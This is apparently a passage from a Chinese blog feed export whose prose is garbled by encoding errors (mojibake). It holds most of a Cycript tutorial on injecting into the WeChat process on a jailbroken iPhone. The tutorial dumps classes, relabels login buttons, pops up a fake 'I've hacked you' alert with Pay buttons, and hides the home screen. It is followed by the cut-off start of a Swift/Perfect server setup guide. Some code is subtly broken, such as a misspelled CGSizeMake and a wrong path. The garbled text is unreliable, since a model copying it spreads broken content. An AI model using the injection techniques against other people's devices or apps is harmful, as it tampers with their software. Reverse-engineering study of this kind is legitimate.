‡ä»Žxå¼€å§‹æˆªå–yä¸ªé•¿åº¦ã€‚ 1234cy# @"Hello World".substr(0, 5)"Hello"cy# @[1, 2, 3].slice(0, 2)[@1, @2] åˆ›å»ºåŠèŽ·å–å¯¹è±¡ æ³¨å…¥ç¨‹åºåŽï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®éœ€è¦åˆ›å»ºéœ€è¦ç”¨åˆ°çš„å¯¹è±¡ï¼Œæˆ–è€…æ ¹æ®å†…å­˜åœ°å€èŽ·å–åˆ°å†…å­˜ä¸­çš„å¯¹è±¡ã€‚ åˆ›å»ºå¯¹è±¡å’ŒOCè¯­æ³•å·®åˆ«ä¸å¤§ã€‚ æ ¹æ®å†…å­˜åœ°å€èŽ·å–å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨# æˆ–è€…ä½¿ç”¨Instanceã€‚ 123456// åˆ›å»ºå¯¹è±¡var view = [[UIView alloc] init][new UIView init]// èŽ·å–å¯¹è±¡#0x1719f9a0var same = new Instance(0x1719f9a0) èŽ·å–å¯¹è±¡ä¿¡æ¯ æ–¹æ³•1ï¼š ç®€å•åŸºæœ¬èŽ·å–æ–¹æ³•ã€‚ ç›´æŽ¥åœ¨å¯¹è±¡å‰é¢åŠ ä¸ª* 1*controllerï¼ˆï¼‰ æ–¹æ³•2ï¼šæ–¹æ³•ä¸€æ— æ³•èŽ·å–ï¼Œå°±ä½¿ç”¨æ–¹æ³•2 1[i for (i in *UIApp)] æ–¹æ³•3ï¼šå»ºè®®æ–¹æ³•ä¸‰ï¼Œæ–¹æ³•ä¸‰èƒ½èŽ·å–åˆ°æ›´å¤š 1function tryPrintIvars(a)&#123; var x=&#123;&#125;; for(i in *a)&#123; try&#123; x[i] = (*a)[i]; &#125; catch(e)&#123;&#125; &#125; return x; &#125; ç±»ä¸Žå¢žåŠ åˆ†ç±» ç±»å®šä¹‰åŠä½¿ç”¨ 12345@implementation MyClass : NSObject &#123; int num;&#125;-(int)returnNum &#123;return this -&gt; num;&#125;@end å¢žåŠ åˆ†ç±» 123456789// å®šä¹‰@implementation NSObject (TestCategory) - description &#123;return "test"&#125; - (double)calculate:(float)num &#123;return num * 10;&#125;@end// åˆ›å»ºå¯¹è±¡test = [new NSObject init]// è°ƒç”¨åˆ†ç±»æ–¹æ³•[test calculate:10] Block12345// å®šä¹‰ä¸€ä¸ªblockcy# testBlock = ^ int (int value) &#123;return value * 10&#125;// è°ƒç”¨cy# testBlock(7) æŸ¥æ‰¾å†…å­˜ä¸­çš„ç±»ä¿¡æ¯ ä½¿ç”¨choose()å‡½æ•°å¯ä»¥æŸ¥æ‰¾åˆ°å†…å­˜ä¸­å¯¹åº”ä¼ é€’è¿›åŽ»çš„ç±»ï¼Œå¦‚æŸ¥æ‰¾ä»Šæ—¥å¤´æ¡é¦–é¡µä¸­çš„å›¾ç‰‡æŽ§ä»¶choose(UIImageView) è¾“å…¥ä¿¡æ¯å¦‚ä¸‹ï¼ˆæ•°æ®å¤ªå¤šåˆ é™¤ä¸€éƒ¨åˆ†ï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡UIImageViewæŽ§ä»¶çš„å†…å­˜åœ°å€èŽ·å–åˆ°å®žä¾‹å¯¹è±¡ï¼Œä¿®æ”¹å¯¹è±¡çš„å„ç§ä¿¡æ¯ç­‰ç­‰ã€‚ 1[#"&lt;UIImageView: 0x17112950; frame = (7.5 10; 11 6); clipsToBounds = YES; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x17393410&gt;&gt;",#"&lt;UIImageView: 0x17114090; frame = (0 0; 0 0); clipsToBounds = YES; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x1736a500&gt;&gt;",#"&lt;UIImageView: 0x171160a0; frame = (-5 0; 5 0); clipsToBounds = YES; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x1736a4d0&gt;&gt;",#"&lt;UIImageView: 0x17138d60; frame = (314.5 -39; 2.5 36); alpha = 0; opaque = NO; autoresize = LM; userInteractionEnabled = NO; layer = &lt;CALayer: 0x17145ad0&gt;&gt;",#"&lt;SSThemedImageView: 0x1713b090; baseClass = UIImageView; frame = (0 0; 0 0); hidden = YES; opaque = NO; gestureRecognizers = &lt;NSArray: 0x1713b380&gt;; layer = &lt;CALayer: 0x17136fb0&gt;&gt;",......",#"&lt;SSThemedImageView: 0x171687b0; baseClass = UIImageV æ‰“å°è§†å›¾å±‚æ¬¡ç»“æž„ å¦‚æžœæˆ‘ä»¬æƒ³çŸ¥é“æŸä¸ªè§†å›¾çš„å±‚æ¬¡ç»“æž„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨Revealï¼Œä½¿ç”¨ä¸‹é¢æŒ‡ä»¤æŸ¥çœ‹æ•´ä¸ªå±‚æ¬¡çš„ç»“æž„ä¿¡æ¯ï¼š 1UIApp.keyWindow.recursiveDescription().toString() èŽ·å–æŸä¸ªç±»çš„æ‰€æœ‰å†…å®¹ æˆ‘ä»¬å¯ä»¥æ‰“å°å‡ºæŸä¸ªç±»çš„æ‰€æœ‰å†…å®¹ä¿¡æ¯ï¼š å®šä¹‰æ‰§è¡Œä¸‹é¢çš„å‡½æ•° å®šä¹‰åŽå°±å¯ä»¥èŽ·å–æŒ‡å®šç±»çš„ä¿¡æ¯ï¼Œè°ƒç”¨printMethods(className, isa) 12345678910111213141516function printMethods(className, isa) &#123; var count = new new Type("I"); var classObj = (isa != undefined) ? objc_getClass(className)-&gt;isa : objc_getClass(className); var methods = class_copyMethodList(classObj, count); var methodsArray = []; for(var i = 0; i &lt; *count; i++) &#123; var method = methods[i]; methodsArray.push(&#123;selector:method_getName(method), implementation:method_getImplementation(method)&#125;); &#125; free(methods); return methodsArray;&#125;printMethods("UIImageView", true)printMethods("TTArticleTabBarController", true) èŽ·å–å½“å‰æŽ§åˆ¶å™¨ å¯ä»¥ç›´æŽ¥æ‰“å°å¯è§æŽ§åˆ¶å™¨ï¼Œå¦‚æžœèŽ·å–ä¸åˆ°å¯ç”¨ä¸‹é¢çš„æ–¹æ³• 1UIApp.keyWindow.rootViewController.visibleViewController ä¹Ÿæ‰“å°å‡ºå½“å‰æŽ§åˆ¶å™¨åç§°åŠå†…å­˜åœ°å€ å®šä¹‰æ‰§è¡Œä¸‹é¢çš„å‡½æ•° è°ƒç”¨å‡½æ•°var vc = currentVC()ï¼Œå¦‚è¾“å‡ºä¿¡æ¯#&quot;&lt;TTArticleTabBarController: 0x17a5bc00&gt;&quot; 12345678910function currentVC() &#123; var app = [UIApplication sharedApplication] var keyWindow = app.keyWindow var rootController = keyWindow.rootViewController var visibleController = rootController.visibleViewController if (!visibleController) &#123; return rootController &#125; return visibleController.childViewControllers[0]&#125; åŠ è½½ç³»ç»ŸåŠ¨æ€åº“ å®šä¹‰æ‰§è¡Œä¸‹é¢èŽ·å–ç³»ç»ŸåŠ¨æ€åº“çš„å‡½æ•° å®šä¹‰å¥½åŽå°±å¯ä»¥è°ƒç”¨å‡½æ•°å¦‚loadFramework(&quot;UIKit&quot;)ï¼Œä¼ é€’æƒ³è¦åŠ è½½çš„æ¡†æž¶åç§°åŠ è½½å¯¹åº”çš„æ¡†æž¶ã€‚ 12345function loadFramework(fw) &#123; var h="/System/Library/",t="Frameworks/"+fw+".framework"; [[NSBundle bundleWithPath:h+t]|| [NSBundle bundleWithPath:h+"Private"+t] load];&#125; NSLogæ‰“å°å‡½æ•°123456789NSLog_ = dlsym(RTLD_DEFAULT, "NSLog")NSLog = function() &#123; var types = 'v', args = [], count = arguments.length; for (var i = 0; i != count; ++i) &#123; types += '@'; args.push(arguments[i]); &#125; new Functor(NSLog_, types).apply(null, args);&#125; CGâ€¦Makeå‡½æ•°123cy# function CGPointMake(x, y) &#123; return &#123;x:x, y:y&#125;; &#125;cy# function CGSizeMake(w, h) &#123; return &#123;width:w, height:h&#125;; &#125;cy# function CGRectMake(x, y, w, h) &#123; return &#123;origin:CGPointMake(x,y), size:CGSizeake(w, h)&#125;; &#125; ä½¿ç”¨Cycriptä¸€çª¥å¾®ä¿¡ è¿™é‡Œç»¼åˆä¸Šé¢çš„çŸ¥è¯†ç»ƒç»ƒæ‰‹ï¼š ä¿®æ”¹å¾®ä¿¡ç™»å½•ç•Œé¢æŒ‰é’®æ–‡å­—åŠèƒŒæ™¯é¢œè‰² åœ¨ç™»å½•ç•Œé¢å¼¹å‡ºä¸€ä¸ªAlertå¼¹æ¡† ä¿®æ”¹å¾®ä¿¡ç™»å½•ç•Œé¢èƒŒæ™¯å›¾ç‰‡ æ³¨å…¥è¿›ç¨‹ èŽ·å–å¾®ä¿¡çš„è¿›ç¨‹IDï¼Œä½¿ç”¨Cycriptæ³¨å…¥å¾®ä¿¡è¿›ç¨‹ã€‚ 123ps -e | grep WeChatcycript -p WeChat// cycript -p è¿›ç¨‹ID // æ›¿æ¢ä¸ºä½ çš„å¾®ä¿¡è¿›ç¨‹ID å±‚æ¬¡ç»“æž„ æŸ¥çœ‹å¾®ä¿¡ç™»å½•ç•Œé¢çš„å±‚æ¬¡ç»“æž„ 1UIApp.keyWindow.recursiveDescription().toString() è¾“å‡ºçš„å±‚æ¬¡ç»“æž„ä¿¡æ¯ï¼š 123456789101112131415`&lt;iConsoleWindow: 0x14f6e420; baseClass = UIWindow; frame = (0 0; 320 568); gestureRecognizers = &lt;NSArray: 0x14f6dea0&gt;; layer = &lt;UIWindowLayer: 0x14f6e7a0&gt;&gt; | &lt;UILayoutContainerView: 0x14e10510; frame = (0 0; 320 568); autoresize = W+H; gestureRecognizers = &lt;NSArray: 0x14e0cd60&gt;; layer = &lt;CALayer: 0x14e103d0&gt;&gt; | | &lt;UINavigationTransitionView: 0x14e0d370; frame = (0 0; 320 568); clipsToBounds = YES; autoresize = W+H; layer = &lt;CALayer: 0x14e0ddd0&gt;&gt; | | | &lt;UIViewControllerWrapperView: 0x14f312e0; frame = (0 0; 320 568); autoresize = W+H; layer = &lt;CALayer: 0x14f31220&gt;&gt; | | | | &lt;UIView: 0x14e15e80; frame = (0 0; 320 568); autoresize = W+H; layer = &lt;CALayer: 0x14ef6410&gt;&gt; | | | | | &lt;UIView: 0x160ce380; frame = (0 20; 320 633); autoresize = W; layer = &lt;CALayer: 0x160c5110&gt;&gt; | | | | | | &lt;UIImageView: 0x14f2bef0; frame = (0 -20; 320 568); opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x14f2bff0&gt;&gt; | | | | | &lt;UIView: 0x160ce5b0; frame = (0 483; 320 65); autoresize = W+TM; layer = &lt;CALayer: 0x160ce690&gt;&gt; | | | | | | &lt;FixTitleColorButton: 0x160ce750; baseClass = UIButton; frame = (20 18; 130 47); clipsToBounds = YES; opaque = NO; autoresize = RM; layer = &lt;CALayer: 0x14f2c140&gt;&gt; | | | | | | | &lt;UIButtonLabel: 0x160ce980; frame = (46.5 13; 37 21.5); text = '\u767b\u5f55'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x160ceae0&gt;&gt; | | | | | | | | &lt;_UILabelContentLayer: 0x160cfc90&gt; (layer) | | | | | | &lt;FixTitleColorButton: 0x160ced10; baseClass = UIButton; frame = (170 18; 130 47); clipsToBounds = YES; opaque = NO; autoresize = LM; layer = &lt;CALayer: 0x160ceeb0&gt;&gt; | | | | | | | &lt;UIButtonLabel: 0x14f2c5f0; frame = (46.5 13; 37 21.5); text = '\u6ce8\u518c'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x14f2c750&gt;&gt; | | | | | | | | &lt;_UILabelContentLayer: 0x160d0cd0&gt; (layer) | | Command + F æœç´¢UIButtonï¼Œå¯ä»¥æ‰¾åˆ°æœ‰ä¸¤ä¸ªUIButtonå¯¹è±¡ï¼Œå¹¶ä¸”textå±žæ€§æ˜¯æ˜¾ç¤ºçš„Unicodeç¼–ç ï¼ˆä¸­æ–‡åœ¨é‡Œé¢æ˜¾ç¤ºçš„å°±æ˜¯Unicodeå­—ç¬¦ç¼–ç ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥åœ¨åœ¨çº¿çš„Unicodeå’Œä¸­æ–‡äº’è½¬ç½‘ç«™è½¬æ¢ä¸€ä¸‹ï¼Œå¦‚è¿™ä¸ªç½‘ç«™ï¼Œå¯ä»¥çœ‹åˆ°å¯¹åº”çš„åˆšå¥½å°±æ˜¯ç•Œé¢ä¸Šæ˜¾ç¤ºçš„ç™»å½•å’Œæ³¨å†Œã€‚ æˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°æ¯ä¸€ä¸ªçš„å¯¹åº”çš„æŒ‰é’®å¯¹è±¡ï¼Œæ”¹å˜æŒ‰é’®æ˜¾ç¤ºæ–‡å­—ï¼š å¦‚æˆ‘æ‹¿åˆ°çš„ç™»å½•æŒ‰é’®å†…å­˜åœ°å€ï¼š0x19c87130 æ³¨å†ŒæŒ‰é’®å†…å­˜åœ°å€ï¼š0x19cd4470 æ³¨æ„è®¾ç½®ä¸­æ–‡æ—¶éœ€è¦å°†ä¸­æ–‡è½¬ä¸ºUnicodeç¼–ç ã€‚ 12#0x19c87130.titleLabel.text = @"\u52ab\u8d22" // \u52ab\u8d22 == "åŠ«è´¢"#0x19cd4470.titleLabel.text = @"\u52ab\u8272" // \u52ab\u8272 == "åŠ«è‰²" ä¿®æ”¹æŒ‰é’®æ–‡å­—èƒŒæ™¯é¢œè‰²ï¼š æˆ‘ä»¬æœç´¢ä¸Šä¸€æ­¥èŽ·å–åˆ°çš„å±‚æ¬¡ç»“æž„ä¿¡æ¯ï¼Œå¯ä»¥æ‰¾åˆ°å«UIButtonLabelçš„å¯¹è±¡ï¼Œä¿®æ”¹æŒ‰é’®æ–‡å­—èƒŒæ™¯å°±æ˜¯ä¿®æ”¹UIButtonLabelçš„èƒŒæ™¯é¢œè‰² åªéœ€è¦æ ¹æ®UIButtonLabelåœ°å€ä¿®æ”¹å³å¯ 12#0x15f4f590.backgroundColor = [UIColor redColor]#0x15f4ffb0.backgroundColor = [UIColor greenColor] å¼¹å‡ºä¸€ä¸ªAlertå¼¹æ¡† å¦‚æžœå¯¹æ–¹æ³•ç­¾åä¸ç†Ÿæ‚‰ï¼Œå¯ä»¥åœ¨Xcodeä¸­æ‰“å‡ºæ¥åŽæ‹·è´è¿›ç»ˆç«¯ å°½é‡ä¸è¦æœ‰ä¸­æ–‡å’Œè¡¨æƒ… ä¹Ÿå¯ä»¥åœ¨ç³»ç»Ÿæ¡Œé¢å¼¹å‡ºï¼Œéœ€è¦æ³¨å…¥åˆ°ç³»ç»Ÿçš„æ¡Œé¢è¿›ç¨‹SBHomeScreenWindow 12var alert = [[UIAlertView alloc] initWithTitle:@"Hack You" message:@"I've hacked you" delegate:nil cancelButtonTitle:@"No pay" otherButtonTitles:@"Pay", nil];[alert show]; ä¿®æ”¹å¾®ä¿¡ç™»å½•ç•Œé¢èƒŒæ™¯å›¾ç‰‡ å¦‚æžœæˆ‘ä»¬æƒ³æ›¿æ¢å¾®ä¿¡çš„æŸä¸ªå›¾ç‰‡ï¼Œè¿™é‡Œä»¥ç™»å½•ç•Œé¢èƒŒæ™¯ä¸ºä¾‹å­ï¼Œåªéœ€è¦å°†æˆ‘ä»¬è‡ªå·±çš„å›¾ç‰‡æ”¾åœ¨å¾®ä¿¡çš„æŸä¸ªç›®å½•ä¸‹ï¼Œå¦‚Documentä¸‹ï¼Œç„¶åŽä¿®æ”¹èƒŒæ™¯å›¾ç‰‡æŽ§ä»¶çš„å›¾ç‰‡å³å¯ã€‚ å°†å›¾ç‰‡æ”¾å…¥å¯¹åº”çš„æ–‡æ¡£ç›®å½•ä¸‹ï¼š å¯ä»¥ç›´æŽ¥ä½¿ç”¨å·¥å…·iMazingï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨scpå‘½ä»¤è¿œç¨‹ä¼ è¾“ï¼ˆè¶Šç‹±ç¬¬ä¸€ç¯‡æ–‡ç« SSéƒ¨åˆ†ï¼‰ï¼Œçœ‹ä¸ªäººçˆ±å¥½ã€‚ èŽ·å–å¾®ä¿¡çš„æ–‡æ¡£ç›®å½•è·¯å¾„åœ°å€ï¼š 123456789101112131415cy# [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0]// è¾“å‡ºæ–‡æ¡£ç›®å½•è·¯å¾„åœ°å€ #"file:///var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/" // å›¾ç‰‡åŠ è½½è·¯å¾„åœ°å€ /var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/``` - åœ¨å±‚æ¬¡ç»“æž„ä¿¡æ¯ä¸­æŸ¥æ‰¾`UIImageView`å³ä¸ºèƒŒæ™¯å›¾ç‰‡æŽ§ä»¶ï¼Œæ ¹æ®å†…å­˜åœ°å€èŽ·å–åˆ°å›¾ç‰‡å¯¹è±¡ï¼Œç„¶åŽé‡æ–°è®¾ç½®å›¾ç‰‡: - å¦‚æˆ‘èŽ·å–åˆ°çš„å›¾ç‰‡æŽ§ä»¶å†…å­˜åœ°å€æ˜¯`0x14706110` - æˆ‘æ”¾åœ¨æ–‡æ¡£ç›®å½•çš„æ›¿æ¢å›¾ç‰‡ä¸º`wechat_testBg.jpg````objc #0x14706110.image = [UIImage imageWithContentsOfFile:@"/var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Docments/wechat_testBg.jpg"] ç»¼åˆæ•ˆæžœå›¾ï¼ˆæ²¡ä¿®æ”¹æ–‡å­—èƒŒæ™¯é¢œè‰²ï¼‰ å…¶ä»–å¥½çŽ©çš„å¤§å®¶å¯ä»¥è‡ªè¡Œæµ‹è¯•ï¼š 12345678910111213141516// æˆªå±cy# var shot = [SBScreenShotter sharedInstance]cy# [shot saveScreenshot:YES]// éšè—æ¡Œé¢cy# UIApp.keyWindow // èŽ·å–SBHomeScreenWindowå¯¹è±¡åœ°å€ï¼ŒSBHomeScreenWindowå°±æ˜¯æ¡Œé¢Windowcy# screen = #0xxxxxxxxxx(ä¸Šä¸€æ­¥èŽ·å–åˆ°çš„å†…å­˜åœ°å€) cy# screen.hidden = YES // éšè—cy# screen.hidden = NO // æ˜¾ç¤º// æ”¹å˜æ‰‹æœºçš„èƒŒæ™¯è‰²cy# screen.backgroundColor = [UIColor redColor]// è®¾ç½®badgecy# [[UIApplication sharedApplication] setApplicationIconBadgeNumber:100] ç¦åˆ© å¦‚æžœæ„Ÿè§‰ä¸Šé¢ä¸€äº›å‡½æ•°æ¯”è¾ƒå¤æ‚ï¼Œä¸æƒ³æ¯æ¬¡éƒ½åŽ»æ•²ä¸€æ¬¡ï¼Œé‚£ä¹ˆç¦åˆ©æ¥äº†ï¼ŒMJRefreshä½œè€…å°†ä¸€äº›Cycriptå®žçŽ°çš„ä¸€äº›å®žç”¨å‡½æ•°å°è£…æˆä¸€ä¸ªè„šæœ¬æ”¾åœ¨GitHubä¸Šé¢ï¼ŒåŸºæœ¬ä¸Šå›Šæ‹¬äº†æˆ‘ä»¬ä¸Šé¢çš„é‚£äº›ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„æ¯”è¾ƒå¸¸ç”¨çš„å‡½æ•°ã€‚ éœ€è¦çš„å°ä¼™ä¼´ä»¬å¯ä»¥ç›´æŽ¥åŽ»åœ¨è¿™é‡Œä¸‹è½½ï¼Œè‡³äºŽå¦‚ä½•ä½¿ç”¨å¤§å®¶çœ‹æ–‡æ¡£å°±å¯ä»¥äº†ï¼Œæ¯”è¾ƒç®€å•ï¼Œéƒ½æ˜¯ä¸­æ–‡å°±æ²¡å¿…è¦æˆ‘åœ¨è½¬è¿°ä¸€éäº†ã€‚ é˜² é€šè¿‡ä¸€ç³»åˆ—æ–‡ç« çš„ä»‹ç»åŠå®žæˆ˜ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„Appé¢ä¸´çš„å®‰å…¨é—®é¢˜æ˜¯å¤šä¹ˆçš„å¯æ€•ï¼Œä¹Ÿæ„è¯†åˆ°ä¿æŠ¤appæ•°æ®çš„é‡è¦æ€§ã€‚ ä½†æ˜¯æ—¢ç„¶çŸ¥é“äº†è¿™ä¹ˆå¤šå¯èƒ½å¯¼è‡´ä¸å®‰å…¨çš„ç‚¹ï¼Œå°±è¦åšå¥½ç›¸åº”çš„é˜²ï¼Œä¿æŠ¤é‡è¦æ•°æ®ä¸è¢«æ”»å‡»è€…ä½¿ç”¨Cycriptæˆ–è€…Runtimeä¿®æ”¹ï¼Œè¿™é‡Œæœ‰ä¸€ç¯‡æ–‡ç« å¯¹å¦‚ä½•é˜²èŒƒä»‹ç»çš„å¾ˆè¯¦ç»†ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒä¸‹ã€‚ å‚è€ƒ Cycript Manual iOSé€†å‘-ç”¨Cycriptè¿›è¡Œè¿è¡Œæ—¶åˆ†æž(å¾®ä¿¡åº”ç”¨) iOSé€†å‘å·¥ç¨‹ï¼ˆ4ï¼‰Cycriptè„šæœ¬è¯­è¨€ä½¿ç”¨ä¸Žå®žæˆ˜]]></content>
      <categories>
        <category>iOS</category>
        <category>æ”»é˜²</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>æ”»é˜²</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swiftå¼€å‘æœåŠ¡ç«¯ï¼ˆä¸‰ï¼‰ï¼šPerfectå†æ¬¡åˆä½“éªŒ]]></title>
    <url>%2Farchives%2Ff7d447dc.html</url>
    <content type="text"><![CDATA[å¤šå°‘å¹´åŽå½“çœ¼å‰çš„ä¸€åˆ‡æˆä¸ºç»“å±€ï¼Œæ—¶é—´æ”¹å˜äº†æˆ‘ï¼Œæ”¹å˜äº†æ‘é‡Œçš„ä¸€åˆ‡ã€‚æ•´ä¸ªè€æŽ‰çš„ä¸€ä»£äººï¼Œååœ¨é»„æ˜é‡Œæ„Ÿå¹å²æœˆæµé€ã€æ²§æ¡‘å·¨å˜ã€‚æ²¡äººçŸ¥é“æœ‰äº›ä¸œè¥¿æ˜¯è¢«æˆ‘æ”¹å˜çš„ã€‚åœ¨æ—¶é—´ç»è¿‡è¿™ä¸ªå°æ‘åº„çš„æ—¶å€™ï¼Œæˆ‘å¸®äº†æ—¶é—´çš„å¿™ï¼Œè®©è¯¥å˜çš„ä¸€åˆ‡éƒ½æœ‰äº†å˜è¿ã€‚æˆ‘è€çš„æ—¶å€™ï¼Œæˆ‘ä¼šè¯´ï¼šæˆ‘æ˜¯åœ¨æ—¶å…‰ä¸­è€çš„ã€‚ â€”â€”åˆ˜äº®ç¨‹ã€Šä¸€ä¸ªäººçš„æ‘åº„ã€‹ ç®€ä»‹ Perfectæ˜¯ä¸€ç»„å®Œæ•´ã€å¼ºå¤§çš„å·¥å…·ç®±ã€è½¯ä»¶æ¡†æž¶ä½“ç³»å’ŒWebåº”ç”¨æœåŠ¡å™¨ï¼Œå¯ä»¥åœ¨Linuxå’ŒmacOS (OS X)ä¸Šä½¿ç”¨ã€‚è¯¥è½¯ä»¶ä½“ç³»ä¸ºSwiftå·¥ç¨‹å¸ˆé‡èº«å®šåˆ¶äº†ä¸€æ•´å¥—ç”¨äºŽå¼€å‘è½»é‡ã€æ˜“ç»´æŠ¤ã€è§„æ¨¡å¯æ‰©å±•çš„Webåº”ç”¨åŠå…¶å®ƒRESTæœåŠ¡çš„è§£å†³æ–¹æ¡ˆï¼Œè¿™æ ·Swiftå·¥ç¨‹å¸ˆå°±å¯ä»¥å®žçŽ°åŒæ—¶åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¸Šé‡‡ç”¨åŒä¸€ç§è¯­è¨€å¼€å‘è½¯ä»¶é¡¹ç›®ã€‚ ç”±äºŽå»ºç«‹åœ¨ä¸€ä¸ªé«˜æ€§èƒ½å¼‚æ­¥ç½‘ç»œå¼•æ“ŽåŸºç¡€ä¸Šï¼ŒPerfectè¿˜èƒ½å¤Ÿåœ¨FastCGIä¸Šè¿è¡Œï¼Œæ”¯æŒå®‰å…¨å¥—æŽ¥å­—åŠ å¯†ï¼ˆSSLï¼‰ã€‚è¯¥è½¯ä»¶ä½“ç³»è¿˜åŒ…å«å¾ˆå¤šå…¶å®ƒäº’è”ç½‘æœåŠ¡å™¨æ‰€éœ€è¦çš„ç‰¹ç‚¹ï¼ŒåŒ…æ‹¬WebSocketså’ŒiOSæ¶ˆæ¯æŽ¨é€ï¼Œè€Œä¸”å¾ˆå¿«ä¼šæœ‰æ›´å¤šå¼ºå¤§çš„åŠŸèƒ½æ”¯æŒã€‚ Swiftå¼€å‘æœåŠ¡ç«¯ï¼ˆä¸€ï¼‰ï¼šMySQLå®‰è£…åŠé…ç½® Swiftå¼€å‘æœåŠ¡ç«¯ï¼ˆäºŒï¼‰ï¼šä½¿ç”¨Parallels Desktopè™šæ‹Ÿæœºå®‰è£…Ubuntuç³»ç»ŸåŠç›¸å…³é…ç½® æ­£æ–‡ æœ‰å¾ˆå¤šå°ä¼™ä¼´è‚¯å®šåœ¨æƒ³ï¼Œæˆ‘ä¸ºä»€ä¹ˆä¼šæŠŠç¬¬ä¸€æ¬¡ç»™äº†PerfectðŸŒï¼Œé‚£æ˜¯å› ä¸ºPerfectæœ‰å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ï¼Œè™½ç„¶ä¸æ˜¯éžå¸¸å®Œå–„çš„ä¸­æ–‡æ–‡æ¡£ï¼Œä½†æœ‰èƒœäºŽæ— ï¼Œå‡å°‘äº†å…¥é—¨çš„éš¾åº¦ã€‚ ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆå«å†æ¬¡åˆä½“éªŒã€‚é‚£æ˜¯å› ä¸ºä¸Šæ¬¡çš„åˆä½“éªŒä¸ç®—ã€‚ä¸ºä»€ä¹ˆä¸ç®—ã€å› ä¸ºæˆ‘è¯´çš„ðŸŒšðŸŒšã€‚ æœ¬ç¯‡å®Œå…¨åŸºäºŽMacç³»ç»Ÿï¼Œä¸ºä»€ä¹ˆä¸åŸºäºŽä¸Šä¸€ç¯‡å®‰è£…çš„Ubuntuç³»ç»Ÿå‘¢ï¼Œå› ä¸ºç›¸è¾ƒäºŽMacï¼Œåœ¨Ubuntuä¸‹åªæ˜¯å¤šäº†Swiftå®‰è£…çŽ¯å¢ƒé…ç½®å’Œå…¶ä»–éœ€è¦çš„æœåŠ¡å®‰è£…ï¼Œéƒ½ç‰¹åˆ«ç®€å•ï¼Œæ›´é‡è¦çš„æ˜¯æˆ‘ä»¬éœ€è¦ä½¿ç”¨åˆ°Xcodeè¿›è¡Œç¼–ç ã€ç¼–è¯‘ã€‚ Perfectå®˜æ–¹æ–‡æ¡£åœ¨è¿™é‡Œ Ubuntuå®‰è£…Swift å…³äºŽåœ¨Ubuntuç³»ç»Ÿä¸‹è½½å®‰è£…Swiftï¼Œå‚è€ƒSwiftå®˜æ–¹æ–‡æ¡£ï¼Œå·²ç»ä»‹ç»çš„éžå¸¸è¯¦ç»†äº†ã€‚ å¦‚æžœä½ ä¸æƒ³çœ‹è‹±æ–‡å®˜æ–¹æ–‡æ¡£ï¼Œå¥½å§ï¼Œé‚£æˆ‘å°±å†æ€»ç»“ï¼ˆå¤åˆ¶ï¼‰ä¸€ä¸‹ï¼š å®‰è£…Git é¦–å…ˆæ£€æŸ¥ç³»ç»Ÿæœ‰æ²¡æœ‰å®‰è£…Gitï¼Œå¦‚æžœæ²¡æœ‰å®‰è£…ï¼Œç›´æŽ¥ä½¿ç”¨åŒ…ç®¡ç†å™¨å®‰è£…ï¼š 1sudo apt-get install git å®‰è£…Swiftä¾èµ–ç»„ä»¶ ç¡®ä¿æ‚¨çš„ç³»ç»Ÿä¸Šçš„åŒ…ç®¡ç†å™¨æ˜¯æœ€æ–°çš„ï¼š 1sudo apt-get update å®‰è£…Swiftå¿…è¦çš„ä¾èµ–ç»„ä»¶ï¼Œå¦‚clangå’ŒPythonç­‰ã€‚ openssh-server æˆ‘ä»¬åœ¨å®‰è£…Ubuntuä¸€ç« ä¸­å·²ç»å®‰è£…è¿‡ï¼Œæ‰€ä»¥ä¸ç”¨é‡å¤å®‰è£…äº†ã€‚ 1sudo apt-get install clang libicu-dev libpython2.7 å®‰è£…Swift ä¸‹è½½æœ€æ–°çš„SwiftäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥æ‰‹åŠ¨ä¸‹è½½ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨wgetä¸‹è½½ã€‚ æ ¹æ®è‡ªå·±çš„Ubuntuç³»ç»Ÿç‰ˆæœ¬å’Œéœ€è¦çš„swiftç‰ˆæœ¬é€‰æ‹©ï¼Œåœ¨è¿™é‡Œä¸‹è½½ã€‚ .tar.gzåŽç¼€çš„æ˜¯å·¥å…·é“¾äºŒè¿›åˆ¶æ–‡ä»¶ .sig åŽç¼€çš„æ˜¯æ•°å­—ç­¾åæ–‡ä»¶ã€‚ 1wget https://swift.org/builds/swift-4.0-release/ubuntu1604/swift-4.0-RELEASE/swift-4.0-RELEASE-ubuntu16.04.tar.gz å¦‚æžœä½ æ˜¯ç¬¬ä¸€æ¬¡ä¸‹è½½å®‰è£…SwiftåŒ…ï¼Œéœ€è¦å°†Swiftçš„PGPå¯†é’¥å¯¼å…¥æ‚¨çš„å¯†é’¥çŽ¯ï¼Œå¯†é’¥å°†ç”¨äºŽéªŒè¯ä¸‹è½½çš„æ–‡ä»¶æœ‰æ— 